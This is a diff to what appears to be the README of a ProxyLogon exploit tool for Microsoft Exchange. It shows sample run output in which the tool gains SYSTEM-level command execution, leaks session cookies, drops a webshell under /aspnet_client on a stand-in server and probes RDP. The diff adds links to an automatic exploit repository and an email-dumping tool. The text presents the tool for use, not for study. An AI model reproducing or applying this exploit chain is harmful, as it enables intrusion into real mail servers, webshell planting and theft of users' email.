@@ -17,8 +17,10 @@ Successful!
 CMD: whoami
 nt authority\system
 ```
-# Want this? (it made from script kiddies)
+#### Automatic Exploit: [https://github.com/Udyz/Automatic-Proxylogon-Exploit](https://github.com/Udyz/Automatic-Proxylogon-Exploit)
+#### Dump Email and View Content: [https://gitlab.com/gvillegas/ohwaa/](https://gitlab.com/gvillegas/ohwaa/)
 
+# Want this? (it made from script kiddies)
 ```
 
 ███████╗██╗   ██╗██╗██╗          ██████╗ ██████╗ ██████╗ ██████╗
@@ -53,7 +55,8 @@ nt authority\system
 (+) Cookie =  ASP.NET_SessionId=4764e710-814b-4f7e-b9f2-bbeb52ac71c9; path=/; HttpOnly, msExchEcpCanary=vTsF_0s3NkKSOSkeMEuaqQydhKUu6dgITlKZqK5bY8KXKFQs-vmADg66hTb8rNUSDjf7yNMsYc0.; path=/ecp
 (+) Leaked OAB Id = bbec9f2d-9814-4954-9870-c74f656304ae
 (+) Preparing payload!
-(+) Webshell drop at https://mail.evil.corp:443/aspnet_client/evilcorp.aspx
+(-) /aspnet_client/evilcorp.aspx Write Webshell ERROR!
+(+) Webshell drop at https://mail.evil.corp:443/aspnet_client/system_web/evilcorp.aspx
 (*) Tested PwnRDP!
 (+) Found port: 0xd3d (3389)
 (!) Oops firewall block connect to RDP
